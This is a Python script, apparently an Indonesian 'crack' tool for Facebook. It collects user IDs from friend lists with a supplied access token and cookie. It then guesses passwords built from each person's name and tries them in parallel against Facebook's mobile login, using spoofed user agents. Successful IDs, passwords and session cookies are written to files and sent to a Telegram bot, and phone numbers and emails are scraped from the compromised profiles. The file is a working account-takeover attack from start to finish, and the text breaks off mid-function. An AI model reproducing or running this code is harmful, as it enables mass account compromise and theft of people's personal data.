import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import sys
import time
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
hours = now.hour
x = datetime.datetime.now()
g = datetime.datetime(2023, 11, 30, 7, 10, 9)

os.system('clear')

try:
    import rich
except:
    cetak(nel('\t• Sedang Menginstall Modul Rich •'))
    os.system('pip install rich')

try:
    import stdiomask
except:
    cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
    os.system('pip install stdiomask')

try:
    import requests
except:
    Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
GR = '\x1b[1;30m'
print(('—'*25)+'\n \x1b[1;30m(\033[1;32m•\x1b[1;30m) \033[1;37mWELCOM TO MY TOLS \033[1;32m•\033[1;37m\n'+('—'*25))
o = input('\033[1;37mTOKEN \033[1;32m:\x1b[1;32m ')
print('\n')
oo = input('\033[1;37mID   \033[1;32m: ')
token = o
ID = oo
pretty.install()
CON = sol()
ugen2 = [
    'Nokia6.1/5.0 (2.91) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/413 (KHTML, like Gecko) Safari/413','Nokia3310/5.0 (7.90) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/7.0 AppleWebKit/446 (KHTML, like Gecko) Safari/446','Nokia3310/5.0 (4.47) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/7.0 AppleWebKit/492 (KHTML, like Gecko) Safari/492','Nokia7.2/5.0 (1.11) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/572 (KHTML, like Gecko) Safari/572','Nokia6.1/5.0 (6.27) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/591 (KHTML, like Gecko) Safari/591','NokiaX2-01/5.0 (3.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/423 (KHTML, like Gecko) Safari/423','Nokia7.2/5.0 (5.98) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/422 (KHTML, like Gecko) Safari/422']
ugen = [
    'Nokia6.1/5.0 (2.91) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/413 (KHTML, like Gecko) Safari/413','Nokia3310/5.0 (7.90) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/7.0 AppleWebKit/446 (KHTML, like Gecko) Safari/446','Nokia3310/5.0 (4.47) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/7.0 AppleWebKit/492 (KHTML, like Gecko) Safari/492','Nokia7.2/5.0 (1.11) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/572 (KHTML, like Gecko) Safari/572','Nokia6.1/5.0 (6.27) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/591 (KHTML, like Gecko) Safari/591','NokiaX2-01/5.0 (3.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/423 (KHTML, like Gecko) Safari/423','Nokia7.2/5.0 (5.98) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/422 (KHTML, like Gecko) Safari/422']
cokbrut = []
ses = requests.Session()
princp = []
for xd in range(10000):
    a = 'Nokia5350/10.1.011 (SymbianOS/10;'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/525 (KHTML, like Gecko)'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Safari/525 3gpp-gba'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/413 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/413 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'SAMSUNG SM-X906B)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'nokiac1-01)'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'U2/1.0.0 UCBrowser/8.9.0.251'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'U2/1.0.0 Mobile UNTRUSTED/1.06'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
(id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'
m = '\x1b[1;91m'
k = '\x1b[93m'
h = '\x1b[1;92m'
hh = '\x1b[32m'
u = '\x1b[95m'
kk = '\x1b[33m'
b = '\x1b[1;96m'
p = '\x1b[0;34m'
AB_A = '\x1b[1;97m'
RS = '\x1b[30m'
AH_F = '\x1b[31m'
AKH_F = '\x1b[32m'
AS_T = '\x1b[33m'
SM = '\x1b[34m'
BN = '\x1b[35m'
AZ_T = '\x1b[36m'
AB_KH = '\x1b[37m'
AH_T = '\x1b[91m'
AKH_T = '\x1b[92m'
AS_F = '\x1b[93m'
WR = '\x1b[95m'
p = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m'
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
MJ4 = '\x1b[38;5;106m'
asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])
dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }
dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def fak_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


def clear():
    os.system('clear')


def back():
    login()


def banner():
    print(('\033[1;37m—'*25)+'\n\x1b[1;30m(\033[1;31m+\x1b[1;30m) \033[1;37mENJOY THE TOOLS \033[1;31m•\033[1;37m\n'+('—'*25))
    print(f'''\t{asu}''')


def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			main()
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()




def login_lagi334():
	try:
		os.system('clear')
		banner()
		#cok = input('[+] Write COOKIE = ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		#dat  = {}
		#raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[+] tekan enter'); os.system('clear'); login()
	except Exception as e:
		print(e)






def main():
    os.system('clear')
    banner()
    ip = requests.get('https://api.ipify.org').text
    gh = 'h'
    print(f''' \033[1;30m[\033[1;32m1\033[1;30m] \033[1;32m- \033[1;37mCrack Publik''')
    print(f''' \033[1;30m[\033[1;32m2\033[1;30m] \033[1;32m- \033[1;37mCrack File''')
    print(f''' \033[1;30m[\033[1;32m0\033[1;30m] \033[1;32m- \033[1;37mlogin''')
    print(f'''_________________________''')
    _____alvino__adijaya_____ = input(f''' \033[1;30m[\033[1;32m+\033[1;30m] \033[1;37mChoose \033[1;32m: ''')
    if _____alvino__adijaya_____ in ('1',):
        dump_massal()
    elif _____alvino__adijaya_____ in ('2878',):
        dump_follower()
    elif _____alvino__adijaya_____ in ('3549',):
        grup()
    elif _____alvino__adijaya_____ in ('2',):
        crack_file()
    elif _____alvino__adijaya_____ in ('1385',):
        result()
    elif _____alvino__adijaya_____ in ('0',):
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print(' [+] . Done Logout + Hapus Kukis ')
        exit()
    else:
        print('>> PILIH YANG BENAR ')
        back()


def error():
    print(f'''{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}''')
    time.sleep(4)
    back()


def crack_file():
    
    try:
        print('')
        fileX = input(f'''\033[1;32m• \033[1;37mName File \033[1;30m:\033[1;32m ''')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        setting()
    except:
        exit(f'''\n{M}File %s not found''' % fileX)

def setting():
    print(f'''{N}___________________________________________________________________''')
    print(f'''{N}├───[{H}1{N}] Old ''')
    print(f'''{N}├───[{H}2{N}] New {H}[RECOMMEND]{N}''')
    print(f'''{N}├───[{H}3{N}] Random {H}[RECOMMEND]{N}''')
    print(f'''{N}├──╭[{h}CHOICE METODE{N}]────────────────────────────────────────────''')
    hu = input(f'''│  ╰─➣{h} ''')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print(f'''{N}├───[{H}+{N}] Choose Yang Bener Kontooll ''')
        exit()
    print(f'''{N}├───────────────────────────────────────────────────────''')
    print(f'''{N}├───[{H}1{N}] Mobile {H}[RECOMMENDED]{N}''')
    print(f'''{N}├───[{H}2{N}] Mbasic ''')
    print(f'''├──╭[{h}CHOICE METODE{N}]────────────────────────────────────────────''')
    hc = input(f'''│  ╰─➣{h} ''')
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('2', '02'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print(f'''{N}│''')
    passwrd()

def dump_massal():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input(f' {u}ID : ')
		
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			
			yu = f'\033[1;30m• \033[1;32mTotal ID \033[1;37m:  \033[2;32m '+str(len(id))
			print(yu)
			setting()
		except Exception as e:
			print(e)


def dump_massal():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	try:
		print('')
		kumpulkan = int(input(f'''    {H}NUMBER IDS : '''))
		print('')
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f''' {N}[-] Your Id ''' + str(bilangan) + ' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/117.0.2045.48 Version/17.0 Mobile/15E148 Safari/604.1"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	        os.system('clear')
	try:
	      os.system('clear')
	      op = f''' \033[1;30m[\033[1;32m-\033[1;30m] \033[1;37mTotal \033[1;37m : ''' + str(len(id))
	      print('')
	      print(op)
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()




def setting():
    wl = f''''''
    print(f'''\033[1;37m]_________________________''')
    teks = f'''\033[1;30m[\033[1;32m01\033[1;30m] \033[1;33m• \033[1;37mOLD \033[1;33m•\n\033[1;30m[\033[1;32m02\033[1;30m] \033[1;33m• \033[1;37mNEW \033[1;33m•\n\033[1;30m[\033[1;32m03\033[1;30m] \033[1;33m• \033[1;37mNEW & OLD \033[1;33m•'''
    print(teks)
    hu = input(f'''\033[1;32m• \033[1;37mChoose \033[1;30m:\033[1;32m ''')
    print(f'''\033[1;37m_________________________''')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ('2', '02'):
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ('3', '03'):
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        ric = ''
        sol().print(mark(ric, style='green'))
        exit()
    hc = '1'
    if hc in ('1', '01'):
        method.append('mobile')
    elif hc in ('',):
        print('[+] PILIH YANG BENAR BANG ')
        setting()
    elif hc in ('4', '04'):
        method.append('mbasic')
    else:
        method.append('mobile')
    print('')
    _jembot_ = 'Y'
    os.system('clear')
    if _jembot_ in ('',):
        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('y', 'Y'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = 't'
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        #cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
        #pwku = input('>> Masukkan Password Tambahan : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()


def passwrd():
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs + frs)
                    pwv.append(frs + ' ' + frs)
                    pwv.append(frs+'12')
                    pwv.append(frs+'11')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'2003')
                    pwv.append(frs+'2004')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'4321')
                    pwv.append(frs+'2007')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs + frs)
                pwv.append(frs + ' ' + frs)
                pwv.append(frs+'12')
                pwv.append(frs+'11')
                pwv.append(frs+'123')
                pwv.append(frs+'1234')
                pwv.append(frs+'12345')
                pwv.append(frs+'123456')
                pwv.append(frs+'2003')
                pwv.append(frs+'2004')
                pwv.append(frs+'2005')
                pwv.append(frs+'2006')
                pwv.append(frs+'4321')
                pwv.append(frs+'2007')                           
                pwv.append('first 1234') 
                pwv.append('first@2020')
                pwv.append('first@2020')
                pwv.append('firstlast@2019')
                pwv.append('firstlast@2020')    
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
               pool.submit(crackmbasic, idf, pwv)

    print('')
    cetak(nel('\t[cyan]•[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] •[white] '))
    print(f'''\033[1;37m[\033[1;34m•\033[1;37m] \033[1;32mOK : \033[1;32m%s ''' % ok)
    print(f'''\033[1;37m[\033[1;34m•\033[1;37m] \033[1;31mCP : \033[1;31m%s\033[1;31m ''' % cp)
    print('')
    print('>> Lanjut Crack Kembali ( Y/t ) ? ')
    woi = input('>> Pilih : ')
    if woi in ('y', 'Y'):
        back()
    else:
        print(f'''\t{x}[=]{k} Been completed {x} <> ''')
        time.sleep(2)
        exit()


def crack(idf, pwv):
    global cp, ok, ok, loop
    bi = random.choice([
        u,
        k,
        kk,
        b,
        h,
        hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    print('\r%s [Cracking-Us] %s/%s • OK : %s • CP : %s • %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        
        try:
            tix = time.time()
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'dnt': '1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua2,
                'upgrade-insecure-requests': '1',
                'Host': 'm.facebook.com' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/',
                'pass': pw,
                'flow': 'login_no_pin',
                'uid': idf,
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1) }
            ses.headers.update({
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'accept-encoding': 'gzip, deflate br',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'sec-fetch-dest': 'document',
                'sec-fetch-user': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'mark.via.gp',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'user-agent': ua,
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'upgrade-insecure-requests': '1',
                'cache-control': 'max-age=0',
                'Host': 'm.facebook.com' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''• ( 𝙲𝙿 )\n_______________________\n\n  ✨ • 𝙸𝙳 ➛ {idf}\n\n\n  ✨ • 𝙿𝙰𝚂𝚂 ➛ {pw}\n\n_______________________\n  ✨ • 𝚄𝚁𝙻 ➛ 𝚑𝚝𝚝𝚙𝚜://𝚠𝚠𝚠.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖/𝚙𝚛𝚘𝚏𝚒𝚕𝚎.𝚙𝚑𝚙?𝚒𝚍={𝚒𝚍𝚏}&𝚖𝚒𝚋𝚎𝚡𝚝𝚒𝚍=𝚉𝚋𝚆𝙺𝚠𝙻
\n\n_______________________\n• 𝙱𝚈 ➛ @𝚉𝙾𝚁𝙾𝚡\n\t\t\t\t\t'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'user-agent': 'Nokia3310/5.0 (5.03) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/6.0 AppleWebKit/468+ (KHTML, like Gecko) Safari/468+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''• ( 𝙾𝙺 )\n_______________________\n\n  ✨ • 𝙸𝙳 ➛ {idf}\n\n\n  ✨ • 𝙿𝙰𝚂𝚂 ➛ {pw}\n\n_______________________\n  ✨ • 𝚄𝚁𝙻 ➛ 𝚑𝚝𝚝𝚙𝚜://𝚠𝚠𝚠.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖/𝚙𝚛𝚘𝚏𝚒𝚕𝚎.𝚙𝚑𝚙?𝚒𝚍={𝚒𝚍𝚏}&𝚖𝚒𝚋𝚎𝚡𝚝𝚒𝚍=𝚉𝚋𝚆𝙺𝚠𝙻
\n\n_______________________\n• 𝙱𝚈 ➛ @𝚉𝙾𝚁𝙾𝚡\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    cek_RAVEN(kuki)
            
    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:email = ''
                    
                    try:
